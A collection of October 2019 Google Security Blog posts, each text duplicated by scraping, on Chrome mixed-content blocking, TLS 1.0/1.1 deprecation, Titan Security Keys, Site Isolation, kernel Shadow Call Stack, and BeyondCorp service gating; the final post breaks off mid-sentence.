{"website": "Google-Security", "title": "\nNo More Mixed Messages About HTTPS\n", "author": ["Posted by Emily Stark and Carlos Joan Rafael Ibarra Lopez, Chrome security team"], "link": "https://security.googleblog.com/2019/10/no-more-mixed-messages-about-https_3.html", "abstract": "                             Posted by Emily Stark and Carlos Joan Rafael Ibarra Lopez, Chrome security team     Update (04/06/2020): Mixed image autoupgrading was originally scheduled for Chrome 81, but will be delayed until at least Chrome 84. Check the  Chrome Platform Status entry  for the latest information about when mixed images will be autoupgraded and blocked if they fail to load over https://. Sites with mixed images will continue to trigger the &#8220;Not Secure&#8221; warning.        Today we&#8217;re announcing that Chrome will gradually start ensuring that https:// pages can only load secure https:// subresources. In a series of steps outlined below, we&#8217;ll start blocking  mixed content  (insecure http:// subresources on https:// pages) by default. This change will improve user privacy and security on the web, and present a clearer browser security UX to users.   In the past several years, the web has made great  progress  in transitioning to HTTPS: Chrome users now spend over 90% of their browsing time on HTTPS on all major platforms. We&#8217;re now turning our attention to making sure that HTTPS configurations across the web are secure and up-to-date.   HTTPS pages commonly suffer from a problem called mixed content, where subresources on the page are loaded insecurely over http://. Browsers block many types of mixed content by default, like scripts and iframes, but images, audio, and video are still allowed to load, which threatens users&#8217; privacy and security. For example, an attacker could tamper with a mixed image of a stock chart to mislead investors, or inject a tracking cookie into a mixed resource load. Loading mixed content also leads to a confusing browser security UX, where the page is presented as neither secure nor insecure but somewhere in between.   In a series of steps starting in Chrome 79,  Chrome will gradually move to blocking all mixed content by default .   To minimize breakage, we will autoupgrade mixed resources to https://, so sites will continue to work if their subresources are already available over https://. Users will be able to enable a setting to opt out of mixed content blocking on particular websites, and below we&#8217;ll describe the resources available to developers to help them find and fix mixed content.    Timeline    Instead of blocking all mixed content all at once, we&#8217;ll be rolling out this change in a series of steps.      In  Chrome 79 , releasing to stable channel in December 2019, we&#8217;ll introduce a new setting to unblock mixed content on specific sites. This setting will apply to mixed scripts, iframes, and other types of content that Chrome currently blocks by default. Users can toggle this setting by clicking the lock icon on any https:// page and clicking Site Settings. This will replace the shield icon that shows up at the right side of the omnibox for unblocking mixed content in previous versions of desktop Chrome.                          Accessing Site settings, from which users will be able to unblock mixed content loads in Chrome 79.          In  Chrome 80 , mixed audio and video resources will be autoupgraded to https://, and Chrome will block them by default if they fail to load over https://. Chrome 80 will be released to early release channels in January 2020. Users can unblock affected audio and video resources with the setting described above.     Also in  Chrome 80 , mixed images will still be allowed to load, but they will cause Chrome to show a &#8220;Not Secure&#8221; chip in the omnibox. We anticipate that this is a clearer security UI for users and that it will motivate websites to migrate their images to HTTPS. Developers can use the  upgrade-insecure-requests  or  block-all-mixed-content  Content Security Policy directives to avoid this warning.&nbsp;                             Omnibox treatment for websites that load mixed images in Chrome 80. &nbsp;           In  Chrome 81 , mixed images will be autoupgraded to https://, and Chrome will block them by default if they fail to load over https://. Chrome 81 will be released to early release channels in February 2020.     Resources for developers    Developers should migrate their mixed content to https:// immediately to avoid warnings and breakage. Here are some resources:      Use  Content Security Policy  and  Lighthouse &#8217;s mixed content audit to discover and fix mixed content on your site.     See  this guide  for general advice on migrating servers to HTTPS.     Check with your CDN, web host, or content management system to see if they have special tools for debugging mixed content. For example, Cloudflare offers a  tool  to rewrite mixed content to https://, and WordPress  plugins  are available as well.                                       Posted by Emily Stark and Carlos Joan Rafael Ibarra Lopez, Chrome security team  Update (04/06/2020): Mixed image autoupgrading was originally scheduled for Chrome 81, but will be delayed until at least Chrome 84. Check the Chrome Platform Status entry for the latest information about when mixed images will be autoupgraded and blocked if they fail to load over https://. Sites with mixed images will continue to trigger the “Not Secure” warning.     Today we’re announcing that Chrome will gradually start ensuring that https:// pages can only load secure https:// subresources. In a series of steps outlined below, we’ll start blocking mixed content (insecure http:// subresources on https:// pages) by default. This change will improve user privacy and security on the web, and present a clearer browser security UX to users.  In the past several years, the web has made great progress in transitioning to HTTPS: Chrome users now spend over 90% of their browsing time on HTTPS on all major platforms. We’re now turning our attention to making sure that HTTPS configurations across the web are secure and up-to-date.  HTTPS pages commonly suffer from a problem called mixed content, where subresources on the page are loaded insecurely over http://. Browsers block many types of mixed content by default, like scripts and iframes, but images, audio, and video are still allowed to load, which threatens users’ privacy and security. For example, an attacker could tamper with a mixed image of a stock chart to mislead investors, or inject a tracking cookie into a mixed resource load. Loading mixed content also leads to a confusing browser security UX, where the page is presented as neither secure nor insecure but somewhere in between.  In a series of steps starting in Chrome 79, Chrome will gradually move to blocking all mixed content by default. To minimize breakage, we will autoupgrade mixed resources to https://, so sites will continue to work if their subresources are already available over https://. Users will be able to enable a setting to opt out of mixed content blocking on particular websites, and below we’ll describe the resources available to developers to help them find and fix mixed content.  Timeline  Instead of blocking all mixed content all at once, we’ll be rolling out this change in a series of steps.   In Chrome 79, releasing to stable channel in December 2019, we’ll introduce a new setting to unblock mixed content on specific sites. This setting will apply to mixed scripts, iframes, and other types of content that Chrome currently blocks by default. Users can toggle this setting by clicking the lock icon on any https:// page and clicking Site Settings. This will replace the shield icon that shows up at the right side of the omnibox for unblocking mixed content in previous versions of desktop Chrome.          Accessing Site settings, from which users will be able to unblock mixed content loads in Chrome 79.    In Chrome 80, mixed audio and video resources will be autoupgraded to https://, and Chrome will block them by default if they fail to load over https://. Chrome 80 will be released to early release channels in January 2020. Users can unblock affected audio and video resources with the setting described above.   Also in Chrome 80, mixed images will still be allowed to load, but they will cause Chrome to show a “Not Secure” chip in the omnibox. We anticipate that this is a clearer security UI for users and that it will motivate websites to migrate their images to HTTPS. Developers can use the upgrade-insecure-requests or block-all-mixed-content Content Security Policy directives to avoid this warning.           Omnibox treatment for websites that load mixed images in Chrome 80.     In Chrome 81, mixed images will be autoupgraded to https://, and Chrome will block them by default if they fail to load over https://. Chrome 81 will be released to early release channels in February 2020.  Resources for developers  Developers should migrate their mixed content to https:// immediately to avoid warnings and breakage. Here are some resources:   Use Content Security Policy and Lighthouse’s mixed content audit to discover and fix mixed content on your site.   See this guide for general advice on migrating servers to HTTPS.   Check with your CDN, web host, or content management system to see if they have special tools for debugging mixed content. For example, Cloudflare offers a tool to rewrite mixed content to https://, and WordPress plugins are available as well.      ", "date": "October 3, 2019"},
{"website": "Google-Security", "title": "\nChrome UI for Deprecating Legacy TLS Versions\n", "author": ["Posted by Chris Thompson, Chrome security team"], "link": "https://security.googleblog.com/2019/10/chrome-ui-for-deprecating-legacy-tls.html", "abstract": "                             Posted by Chris Thompson, Chrome security team    [Cross-posted from the&nbsp; Chromium blog ]          Update (04/06/2020): The removal of legacy TLS versions was originally scheduled for Chrome 81, but is being delayed until at least Chrome 84. Chrome will continue to show the &#8220;Not Secure&#8221; indicator for sites using TLS 1.0 or 1.1, and Chrome 81 Beta will show the full page interstitial warning for affected sites. Our hope is that this will help alert affected site owners ahead of the delayed removal. Check the  Chrome Platform Status entry  for the latest information about the removal of TLS 1.0 and 1.1 support.    Last October  we announced  our plans to remove support for TLS 1.0 and 1.1 in Chrome 81. In this post we&#8217;re announcing a pre-removal phase in which we&#8217;ll introduce a gentler warning UI, and previewing the UI that we&#8217;ll use to block TLS 1.0 and 1.1 in Chrome 81. Site administrators should immediately enable TLS 1.2 or later to avoid these UI treatments.   While legacy TLS usage has decreased, we still see  over 0.5% of page loads  using these deprecated versions. To ease the transition to the final removal of support and to reduce user surprise when outdated configurations stop working, Chrome will discontinue support in two steps: first, showing new security indicators for sites using these deprecated versions; and second, blocking connections to these sites with a full page warning.    Pre-removal warning    Starting January 13, 2020, for Chrome 79 and higher, we will show a &#8220;Not Secure&#8221; indicator for sites using TLS 1.0 or 1.1 to alert users to the outdated configuration:            The new security indicator and connection security information that will be shown to users who visit a site using TLS 1.0 or 1.1 starting in January 2020.       When a site uses TLS 1.0 or 1.1, Chrome will downgrade the security indicator and show a more detailed warning message inside Page Info. This change will not block users from visiting or using the page, but will alert them to the downgraded security of the connection.   Note that Chrome already shows warnings in DevTools to alert site owners that they are using a deprecated version of TLS.    Removal UI    In Chrome 81, which will be released to the Stable channel in March 2020, we will begin blocking connections to sites using TLS 1.0 or 1.1, showing a full page interstitial warning:            The full screen interstitial warning that will be shown to users who visit a site using TLS 1.0 or 1.1 starting in Chrome 81. Final warning subject to change.       Site administrators should immediately enable TLS 1.2 or later. Depending on server software (such as Apache or nginx), this may be a configuration change or a software update. Additionally, we encourage all sites to revisit their TLS configuration. In  our original announcement , we outlined our current criteria for modern TLS.   Enterprise deployments can preview the final removal of TLS 1.0 and 1.1 by setting the SSLVersionMin policy to &#8220;tls1.2&#8221;. This will prevent clients from connecting over these protocol versions. For enterprise deployments that need more time, this same policy can be used to re-enable TLS 1.0 or TLS 1.1 and disable the warning UIs until January 2021.                                    Posted by Chris Thompson, Chrome security team [Cross-posted from the Chromium blog]   Update (04/06/2020): The removal of legacy TLS versions was originally scheduled for Chrome 81, but is being delayed until at least Chrome 84. Chrome will continue to show the “Not Secure” indicator for sites using TLS 1.0 or 1.1, and Chrome 81 Beta will show the full page interstitial warning for affected sites. Our hope is that this will help alert affected site owners ahead of the delayed removal. Check the Chrome Platform Status entry for the latest information about the removal of TLS 1.0 and 1.1 support.  Last October we announced our plans to remove support for TLS 1.0 and 1.1 in Chrome 81. In this post we’re announcing a pre-removal phase in which we’ll introduce a gentler warning UI, and previewing the UI that we’ll use to block TLS 1.0 and 1.1 in Chrome 81. Site administrators should immediately enable TLS 1.2 or later to avoid these UI treatments.  While legacy TLS usage has decreased, we still see over 0.5% of page loads using these deprecated versions. To ease the transition to the final removal of support and to reduce user surprise when outdated configurations stop working, Chrome will discontinue support in two steps: first, showing new security indicators for sites using these deprecated versions; and second, blocking connections to these sites with a full page warning.  Pre-removal warning  Starting January 13, 2020, for Chrome 79 and higher, we will show a “Not Secure” indicator for sites using TLS 1.0 or 1.1 to alert users to the outdated configuration:    The new security indicator and connection security information that will be shown to users who visit a site using TLS 1.0 or 1.1 starting in January 2020.  When a site uses TLS 1.0 or 1.1, Chrome will downgrade the security indicator and show a more detailed warning message inside Page Info. This change will not block users from visiting or using the page, but will alert them to the downgraded security of the connection.  Note that Chrome already shows warnings in DevTools to alert site owners that they are using a deprecated version of TLS.  Removal UI  In Chrome 81, which will be released to the Stable channel in March 2020, we will begin blocking connections to sites using TLS 1.0 or 1.1, showing a full page interstitial warning:    The full screen interstitial warning that will be shown to users who visit a site using TLS 1.0 or 1.1 starting in Chrome 81. Final warning subject to change.  Site administrators should immediately enable TLS 1.2 or later. Depending on server software (such as Apache or nginx), this may be a configuration change or a software update. Additionally, we encourage all sites to revisit their TLS configuration. In our original announcement, we outlined our current criteria for modern TLS.  Enterprise deployments can preview the final removal of TLS 1.0 and 1.1 by setting the SSLVersionMin policy to “tls1.2”. This will prevent clients from connecting over these protocol versions. For enterprise deployments that need more time, this same policy can be used to re-enable TLS 1.0 or TLS 1.1 and disable the warning UIs until January 2021.     ", "date": "October 1, 2019"},
{"website": "Google-Security", "title": "\nUSB-C Titan Security Keys - available tomorrow in the US\n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud "], "link": "https://security.googleblog.com/2019/10/usb-c-titan-security-keys-available.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud&nbsp;       Securing access to online accounts is critical for safeguarding private, financial, and other sensitive data online. Phishing - where an attacker tries to trick you into giving them your username and password - is one of the most common causes of data breaches. To protect user accounts, we&#8217;ve long made it a priority to offer users many convenient forms of 2-Step Verification (2SV), also known as two-factor authentication (2FA), in addition to  Google&#8217;s automatic protections . These measures help to ensure that users are not relying solely on passwords for account security.     For users at higher risk (e.g., IT administrators, executives, politicians, activists) who need more effective protection against targeted attacks, security keys provide the  strongest  form of 2FA. To make this phishing-resistant security accessible to more people and businesses, we recently  built  this capability into Android phones,  expanded  the availability of Titan Security Keys to more regions (Canada, France, Japan, the UK), and  extended  Google&#8217;s Advanced Protection Program to the enterprise.     Starting tomorrow, you will have an additional option: Google&#8217;s new USB-C Titan Security Key, compatible with your Android, Chrome OS, macOS, and Windows devices.                       USB-C Titan Security Key          We partnered with  Yubico  to manufacture the USB-C Titan Security Key. We have had a long-standing working and customer relationship with Yubico that began in 2012 with the collaborative effort to create the  FIDO  Universal 2nd Factor (U2F) standard, the first open standard to enable phishing-resistant authentication. This is the same security technology that we use at Google to protect access to internal applications and systems.    USB-C Titan Security Keys are built with a hardware secure element chip that includes firmware engineered by Google to verify the key&#8217;s integrity. This is the same secure element chip and firmware that we use in our existing USB-A/NFC and Bluetooth/NFC/USB Titan Security Key models manufactured in partnership with  Feitian Technologies .    USB-C Titan Security Keys will be available tomorrow individually for $40 on the  Google Store  in the United States. USB-A/NFC and Bluetooth/NFC/USB Titan Security Keys will also become available individually in addition to the existing bundle.  Bulk orders  are available for enterprise organizations in select countries.              We highly recommend all users at a higher risk of targeted attacks to get Titan Security Keys and enroll into the  Advanced Protection Program  (APP), which provides Google&#8217;s industry-leading security protections to defend against evolving methods that attackers use to gain access to your accounts and data. You can also use Titan Security Keys for any site where FIDO security keys are supported for 2FA, including your personal or work  Google Account ,  1Password ,  Coinbase ,  Dropbox ,  Facebook ,  GitHub ,  Salesforce ,  Stripe ,  Twitter , and more.                                     Posted by Christiaan Brand, Product Manager, Google Cloud    Securing access to online accounts is critical for safeguarding private, financial, and other sensitive data online. Phishing - where an attacker tries to trick you into giving them your username and password - is one of the most common causes of data breaches. To protect user accounts, we’ve long made it a priority to offer users many convenient forms of 2-Step Verification (2SV), also known as two-factor authentication (2FA), in addition to Google’s automatic protections. These measures help to ensure that users are not relying solely on passwords for account security.   For users at higher risk (e.g., IT administrators, executives, politicians, activists) who need more effective protection against targeted attacks, security keys provide the strongest form of 2FA. To make this phishing-resistant security accessible to more people and businesses, we recently built this capability into Android phones, expanded the availability of Titan Security Keys to more regions (Canada, France, Japan, the UK), and extended Google’s Advanced Protection Program to the enterprise.   Starting tomorrow, you will have an additional option: Google’s new USB-C Titan Security Key, compatible with your Android, Chrome OS, macOS, and Windows devices.        USB-C Titan Security Key   We partnered with Yubico to manufacture the USB-C Titan Security Key. We have had a long-standing working and customer relationship with Yubico that began in 2012 with the collaborative effort to create the FIDO Universal 2nd Factor (U2F) standard, the first open standard to enable phishing-resistant authentication. This is the same security technology that we use at Google to protect access to internal applications and systems.  USB-C Titan Security Keys are built with a hardware secure element chip that includes firmware engineered by Google to verify the key’s integrity. This is the same secure element chip and firmware that we use in our existing USB-A/NFC and Bluetooth/NFC/USB Titan Security Key models manufactured in partnership with Feitian Technologies.  USB-C Titan Security Keys will be available tomorrow individually for $40 on the Google Store in the United States. USB-A/NFC and Bluetooth/NFC/USB Titan Security Keys will also become available individually in addition to the existing bundle. Bulk orders are available for enterprise organizations in select countries.      We highly recommend all users at a higher risk of targeted attacks to get Titan Security Keys and enroll into the Advanced Protection Program (APP), which provides Google’s industry-leading security protections to defend against evolving methods that attackers use to gain access to your accounts and data. You can also use Titan Security Keys for any site where FIDO security keys are supported for 2FA, including your personal or work Google Account, 1Password, Coinbase, Dropbox, Facebook, GitHub, Salesforce, Stripe, Twitter, and more.     ", "date": "October 14, 2019"},
{"website": "Google-Security", "title": "\nImproving Site Isolation for Stronger Browser Security\n", "author": ["Posted by Charlie Reis, Site Isolator "], "link": "https://security.googleblog.com/2019/10/improving-site-isolation-for-stronger.html", "abstract": "                             Posted by Charlie Reis, Site Isolator       The Chrome Security team values having multiple lines of defense. Web browsers are complex, and malicious web pages may try to find and exploit browser bugs to steal data. Additional lines of defense, like  sandboxes , make it harder for attackers to access your computer, even if bugs in the browser are exploited. With  Site Isolation , Chrome has gained a new line of defense that helps protect your accounts on the Web as well.     Site Isolation ensures that pages from different sites end up in different sandboxed processes in the browser. Chrome can thus limit the entire process to accessing data from only one site, making it harder for an attacker to steal cross-site data. We started isolating all sites  for desktop users back in Chrome 67 , and now we&#8217;re excited to enable it on Android for sites that users log into  in Chrome 77 . We've also strengthened Site Isolation on desktop to help defend against even fully compromised processes.     Site Isolation helps defend against two types of threats. First, attackers may try to use advanced \"side channel\" attacks to leak sensitive data from a process through unexpected means. For example,  Spectre  attacks take advantage of CPU performance features to access data that should be off limits. With Site Isolation, it is harder for the attacker to get cross-site data into their process in the first place.     Second, even more powerful attackers may discover security bugs in the browser, allowing them to completely hijack the sandboxed process. On desktop platforms, Site Isolation can now catch these misbehaving processes and limit their access to cross-site data. We're working to bring this level of hijacked process protection to Android in the future as well.     Thanks to this extra line of defense, Chrome can now help keep your web accounts even more secure. We are still making improvements to get the full benefits of Site Isolation, but this change gives Chrome a solid foundation for protecting your data.     If you&#8217;d like to learn more, check out our  technical write up  on the Chromium blog.                                     Posted by Charlie Reis, Site Isolator    The Chrome Security team values having multiple lines of defense. Web browsers are complex, and malicious web pages may try to find and exploit browser bugs to steal data. Additional lines of defense, like sandboxes, make it harder for attackers to access your computer, even if bugs in the browser are exploited. With Site Isolation, Chrome has gained a new line of defense that helps protect your accounts on the Web as well.   Site Isolation ensures that pages from different sites end up in different sandboxed processes in the browser. Chrome can thus limit the entire process to accessing data from only one site, making it harder for an attacker to steal cross-site data. We started isolating all sites for desktop users back in Chrome 67, and now we’re excited to enable it on Android for sites that users log into in Chrome 77. We've also strengthened Site Isolation on desktop to help defend against even fully compromised processes.   Site Isolation helps defend against two types of threats. First, attackers may try to use advanced \"side channel\" attacks to leak sensitive data from a process through unexpected means. For example, Spectre attacks take advantage of CPU performance features to access data that should be off limits. With Site Isolation, it is harder for the attacker to get cross-site data into their process in the first place.   Second, even more powerful attackers may discover security bugs in the browser, allowing them to completely hijack the sandboxed process. On desktop platforms, Site Isolation can now catch these misbehaving processes and limit their access to cross-site data. We're working to bring this level of hijacked process protection to Android in the future as well.   Thanks to this extra line of defense, Chrome can now help keep your web accounts even more secure. We are still making improvements to get the full benefits of Site Isolation, but this change gives Chrome a solid foundation for protecting your data.   If you’d like to learn more, check out our technical write up on the Chromium blog.      ", "date": "October 17, 2019"},
{"website": "Google-Security", "title": "\nProtecting against code reuse in the Linux kernel with Shadow Call Stack\n", "author": ["Posted by Sami Tolvanen, Staff Software Engineer, Android Security & Privacy Team\n"], "link": "https://security.googleblog.com/2019/10/protecting-against-code-reuse-in-linux_30.html", "abstract": "                             Posted by Sami Tolvanen, Staff Software Engineer, Android Security &amp; Privacy Team           The Linux kernel is responsible for enforcing much of Android&#8217;s security model, which is why we have put a lot of effort into hardening the Android Linux kernel against exploitation. In Android 9, we introduced support for Clang&#8217;s forward-edge  Control-Flow Integrity (CFI)  enforcement to protect the kernel from code reuse attacks that modify stored function pointers. This year, we have added backward-edge protection for return addresses using Clang&#8217;s  Shadow Call Stack (SCS) .   Google&#8217;s Pixel 3 and 3a phones have kernel SCS enabled in the Android 10 update, and Pixel 4 ships with this protection out of the box. We have made patches available to all supported versions of the Android kernel and also maintain a patch set against upstream Linux. This post explains how kernel SCS works, the benefits and trade-offs, how to enable the feature, and how to debug potential issues.     Return-oriented programming  As kernel memory protections increasingly make code injection more difficult, attackers commonly use control flow hijacking to exploit kernel bugs.  Return-oriented programming (ROP)  is a technique where the attacker gains control of the kernel stack to overwrite function return addresses and redirect execution to carefully selected parts of existing kernel code, known as ROP gadgets. While address space randomization and stack canaries can make this attack more challenging, return addresses stored on the stack remain vulnerable to many overwrite flaws. The general availability of tools for  automatically generating this type of kernel exploit  makes protecting against it increasingly important.     Shadow Call Stack  One method of protecting return addresses is to store them in a separately allocated shadow stack that&#8217;s not vulnerable to traditional buffer overflows. This can also help protect against arbitrary overwrite attacks.   Clang added the Shadow Call Stack instrumentation pass for arm64 in version 7. When enabled, each non-leaf function that pushes the return address to the stack will be instrumented with code that also saves the address to a shadow stack. A pointer to the current task&#8217;s shadow stack is always kept in the x18 register, which is reserved for this purpose. Here&#8217;s what instrumentation looks like in a typical kernel function:         SCS doesn&#8217;t require error handling as it uses the return address from the shadow stack unconditionally. Compatibility with stack unwinding for debugging purposes is maintained by keeping a copy of the return address in the normal stack, but this value is never used for control flow decisions.   Despite requiring a dedicated register, SCS has minimal performance overhead. The instrumentation itself consists of one load and one store instruction per function, which results in a performance impact that&#8217;s within noise in our benchmarking. Allocating a shadow stack for each thread does increase the kernel&#8217;s memory usage but as only return addresses are stored, the stack size defaults to 1kB. Therefore, the overhead is a fraction of the memory used for the already small regular kernel stacks.   SCS patches are available for Android kernels  4.14  and  4.19 , and for  upstream Linux . It can be enabled using the following configuration options:       CONFIG_SHADOW_CALL_STACK=y # CONFIG_SHADOW_CALL_STACK_VMAP is not set # CONFIG_DEBUG_STACK_USAGE is not set      By default, shadow stacks are not virtually allocated to minimize memory overhead, but CONFIG_SHADOW_CALL_STACK_VMAP can be enabled for better stack exhaustion protection. With CONFIG_DEBUG_STACK_USAGE, the kernel will also print out shadow stack usage in addition to normal stack usage which can be helpful when debugging issues.     Alternatives  Signing return addresses using  ARMv8.3 Pointer Authentication (PAC)  is an alternative to shadow stacks. PAC has similar security properties and comparable performance to SCS but without the memory allocation overhead. Unfortunately, PAC requires hardware support, which means it cannot be used on existing devices, but may be a viable option for future devices. For x86, Intel&#8217;s  Control-flow Enforcement Technology (CET)  extension will offer a native shadow stack support, but also requires compatible hardware.     Conclusion  We have improved Linux kernel code reuse attack protections on Pixel devices running Android 10. Pixel 3, 3a, and 4 kernels have both CFI and SCS enabled and we have made patches available to all Android OEMs.                                    Posted by Sami Tolvanen, Staff Software Engineer, Android Security & Privacy Team      The Linux kernel is responsible for enforcing much of Android’s security model, which is why we have put a lot of effort into hardening the Android Linux kernel against exploitation. In Android 9, we introduced support for Clang’s forward-edge Control-Flow Integrity (CFI) enforcement to protect the kernel from code reuse attacks that modify stored function pointers. This year, we have added backward-edge protection for return addresses using Clang’s Shadow Call Stack (SCS).  Google’s Pixel 3 and 3a phones have kernel SCS enabled in the Android 10 update, and Pixel 4 ships with this protection out of the box. We have made patches available to all supported versions of the Android kernel and also maintain a patch set against upstream Linux. This post explains how kernel SCS works, the benefits and trade-offs, how to enable the feature, and how to debug potential issues.   Return-oriented programming As kernel memory protections increasingly make code injection more difficult, attackers commonly use control flow hijacking to exploit kernel bugs. Return-oriented programming (ROP) is a technique where the attacker gains control of the kernel stack to overwrite function return addresses and redirect execution to carefully selected parts of existing kernel code, known as ROP gadgets. While address space randomization and stack canaries can make this attack more challenging, return addresses stored on the stack remain vulnerable to many overwrite flaws. The general availability of tools for automatically generating this type of kernel exploit makes protecting against it increasingly important.   Shadow Call Stack One method of protecting return addresses is to store them in a separately allocated shadow stack that’s not vulnerable to traditional buffer overflows. This can also help protect against arbitrary overwrite attacks.  Clang added the Shadow Call Stack instrumentation pass for arm64 in version 7. When enabled, each non-leaf function that pushes the return address to the stack will be instrumented with code that also saves the address to a shadow stack. A pointer to the current task’s shadow stack is always kept in the x18 register, which is reserved for this purpose. Here’s what instrumentation looks like in a typical kernel function:    SCS doesn’t require error handling as it uses the return address from the shadow stack unconditionally. Compatibility with stack unwinding for debugging purposes is maintained by keeping a copy of the return address in the normal stack, but this value is never used for control flow decisions.  Despite requiring a dedicated register, SCS has minimal performance overhead. The instrumentation itself consists of one load and one store instruction per function, which results in a performance impact that’s within noise in our benchmarking. Allocating a shadow stack for each thread does increase the kernel’s memory usage but as only return addresses are stored, the stack size defaults to 1kB. Therefore, the overhead is a fraction of the memory used for the already small regular kernel stacks.  SCS patches are available for Android kernels 4.14 and 4.19, and for upstream Linux. It can be enabled using the following configuration options:     CONFIG_SHADOW_CALL_STACK=y # CONFIG_SHADOW_CALL_STACK_VMAP is not set # CONFIG_DEBUG_STACK_USAGE is not set    By default, shadow stacks are not virtually allocated to minimize memory overhead, but CONFIG_SHADOW_CALL_STACK_VMAP can be enabled for better stack exhaustion protection. With CONFIG_DEBUG_STACK_USAGE, the kernel will also print out shadow stack usage in addition to normal stack usage which can be helpful when debugging issues.   Alternatives Signing return addresses using ARMv8.3 Pointer Authentication (PAC) is an alternative to shadow stacks. PAC has similar security properties and comparable performance to SCS but without the memory allocation overhead. Unfortunately, PAC requires hardware support, which means it cannot be used on existing devices, but may be a viable option for future devices. For x86, Intel’s Control-flow Enforcement Technology (CET) extension will offer a native shadow stack support, but also requires compatible hardware.   Conclusion We have improved Linux kernel code reuse attack protections on Pixel devices running Android 10. Pixel 3, 3a, and 4 kernels have both CFI and SCS enabled and we have made patches available to all Android OEMs.     ", "date": "October 30, 2019"},
{"website": "Google-Security", "title": "\nHow Google adopted BeyondCorp: Part 4 (services)\n", "author": ["Posted by Guilherme Gonçalves, Site Reliability Engineer and Kyle O'Malley, Security Engineer "], "link": "https://security.googleblog.com/2019/10/how-google-adopted-beyondcorp-part-4.html", "abstract": "                             Posted by Guilherme Gonçalves, Site Reliability Engineer and Kyle O'Malley, Security Engineer&nbsp;           Intro    This is the final post in a series of four, in which we set out to revisit various  BeyondCorp  topics and share lessons that were learnt along the internal implementation path at Google.    The  first post  in this series focused on providing necessary context for how Google adopted BeyondCorp, Google&#8217;s implementation of the zero trust security model. The  second post  focused on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. The  third post  focused on tiered access - how to define access tiers and rules and how to simplify troubleshooting when things go wrong.    This post introduces the concept of gated services, how to identify and, subsequently, migrate them and the associated lessons we learned along the way.                         High level architecture for BeyondCorp      Identifying and gating services        How do you identify and categorize all the services that should be gated?   Google began as a web-based company, and as it matured in the modern era, most internal business applications were developed with a web-first approach. These applications were hosted on similar internal architecture as our external services, with the exception that they could only be accessed on corporate office networks. Thus, identifying services to be gated by BeyondCorp was made easier for us due to the fact that most internal services were already properly inventoried and hosted via standard, central solutions. Migration, in many cases, was as simple as a DNS change. Solid IT asset inventory systems and maintenance are critical to migrating to a zero trust security model.    Enforcement of zero trust access policies began with services which we determined would not be meaningfully impacted by the change in access requirements. For most services, requirements could be gathered via typical access log analysis or consulting with service owners. Services which could not be readily gated by default ACL requirements required service owners to develop strict access groups and/or eliminate risky workflows before they could be migrated.        How do you know which trust tier is needed for every service?   As discussed in our  previous blog post , Google makes internal services available based on device trust tiers. Today, those services are accessible by the highest trust tier by default.     When the intent of the change is to restrict access to a service to a specific group or team, service owners are free to propose access changes to add or remove restrictions to their service. Access changes which are deemed to be sufficiently low risk can be automatically approved. In all other cases, such as where the owning team wants to expose a service to a risky device tier, they must work with security engineers to follow the  principle of least privilege  and devise solutions.       What do you do with services that are incompatible with BeyondCorp ideals?     It may not always be possible to gate an application by the preferred zero trust solution. Services that cannot be easily gated typically fall into these categories:     Type 1: \"Non-proxyable protocols\", e.g. non-HTTP/HTTPS traffic.   Type 2: Low latency requirements or localized high throughput traffic.   Type 3: Administrative and emergency access networks.    The typical first step in finding a solution for these cases is finding a way to remove the need for that service altogether. In many cases, this was made possible by deprecating or replacing systems which could not be made compatible with the BeyondCorp implementation.    When that was not an option, we found that no single solution would work for all critical requirements:      Solutions for the \"Type 1\" traffic have generally involved maintaining a specialized client tunneling which strongly enforces authentication and authorization decisions on the client and the server end of the connection. This is usually client/server type traffic which is similar to HTTP traffic in that connectivity is typically multi-point to point.   Solutions to the \"Type 2\" problems generally rely on moving BeyondCorp-compatible compute resources locally or developing a solution tightly integrated with network access equipment to selectively forward \"local\" traffic without permanently opening network holes.   As for &#8220;Type 3,&#8221; it would be ideal to completely eliminate all privileged internal networks. However, the reality is that some privileged networking will likely always be required to maintain the network itself and also to provide emergency access during outages.    It should be noted that server-to-server traffic in secure production data center environments does not necessarily rely on BeyondCorp, although many systems are integrated regardless, due to the Service-Oriented Design benefits that BeyondCorp inherently provides.&nbsp;       How do you prioritize gating?     Prioritization starts by identifying all the services that are currently accessible via internal IP-access alone and migrating the most critical services to BeyondCorp, while working to slowly ratchet down permissions via exception management processes. Criticality of the service may also depend on the number and type of users, sensitivity of data handled, security and privacy risks enabled by the service.       Migration logistics     Most services required integration testing with the BeyondCorp proxy. Service teams were encouraged to stand up \"test\" services which were used to test functionality behind the BeyondCorp proxy. Most services that performed their own access control enforcement were reconfigured to instead rely on BeyondCorp for all user/group authentication and authorization. Service teams have been encouraged to develop their own \"fine-grained\" discretionary access controls in the services by leveraging session data provided by the BeyondCorp proxy.         Lessons learnt          Allow coarse gating and exceptions     Inventory: It's easy to overlook the importance of keeping a good inventory of services, devices, owners and security exceptions. The journey to a BeyondCorp world should start by solving organizational challenges when managing and maintaining data quality in inventory systems. In short, knowing how a service works, who should access it, and what makes that acceptable are the central tenets of managing BeyondCorp. Fine-grained access control is severely complicated when this insight is missing.    Legacy protocols: Most large enterprises will inevitably need to support workflows and protocols which cannot be migrated to a BeyondCorp world (in any reasonable amount of time). Exception management and service inventory become crucial at this stage while stakeholders develop solutions.     Run highly reliable systems   The BeyondCorp initiative would not be sustainable at Google&#8217;s scale without the involvement of various Site Reliability Engineering (SRE) teams across the inventory systems, BeyondCorp infrastructure and client side solutions. The ability to successfully achieve wide-spread adoption of changes this large can be hampered by perceived (or in some cases, actual) reliability issues. Understanding the user workflows that might be impacted, working with key stakeholders and ensuring the transition is smooth and trouble-free  for all users helps protect against backlash and avoids users finding undesirable workarounds. By applying our  reliability engineering practices , those teams helped to ensure that the components of our implementation all have availability and latency targets, operational robustness, etc. These are compatible with our business needs and intended user experiences.       Put employees in control as much as possible     Employees cover a broad range of job functions with varying requirements of technology and tools. In addition to communicating changes to our employees early, we provide them with self-service solutions for handling exceptions or addressing issues affecting their devices. By putting our employees in control, we help to ensure that security mechanisms do not get in their way, helping with the acceptance and scaling processes.         Summary      Throughout this series of blog posts, we set out to revisit and demystify BeyondCorp, Google&#8217;s internal implementation of a zero trust security model. The four posts had different focus areas -  setting context ,  devices ,  tiered access  and, finally, services (this post).    If you want to learn more, you can check out the  BeyondCorp research papers . In addition, getting started with BeyondCorp is now easier using zero trust solutions from  Google Cloud (context-aware access)  and other enterprise providers. Lastly, stay tuned for an upcoming BeyondCorp 